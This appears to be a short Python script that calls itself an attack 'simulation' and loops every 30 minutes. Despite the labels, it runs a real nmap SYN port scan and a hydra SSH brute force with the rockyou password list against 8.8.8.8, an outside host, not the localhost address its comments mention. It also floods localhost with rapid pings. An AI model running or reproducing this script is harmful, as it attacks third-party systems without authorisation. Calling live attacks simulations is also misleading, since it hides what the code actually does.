#!/usr/bin/env python3

import time
import os
import subprocess

# How long to wait between attack rounds (30 min)
INTERVAL_SECS = 30 * 60

# Your local IP for testing (adjust if needed)
LOCAL_IP = "127.0.0.1"
def simulate_port_scan():
    print("[SIMULATION] Running port scan simulation...")
    os.system("sudo nmap -sS -p 1-1000 8.8.8.8")

def simulate_brute_force():
    print("[SIMULATION] Running brute force simulation...")
    os.system(f"hydra -l user -P /Users/TonyJCha/Downloads/rockyou.txt ssh://8.8.8.8")

def simulate_ddos():
    print("[SIMULATION] Running DDoS simulation...")
    # Flood with ICMP packets for 10 seconds
    os.system(f"ping -c 5000 -i 0.01 {LOCAL_IP}")

def run_attacks():
    simulate_port_scan()
    simulate_brute_force()
    simulate_ddos()

if __name__ == "__main__":
    while True:
        print("[INFO] Starting simulated attack round...")
        run_attacks()
        print("[INFO] Sleeping for 30 minutes...\n")
        time.sleep(INTERVAL_SECS)

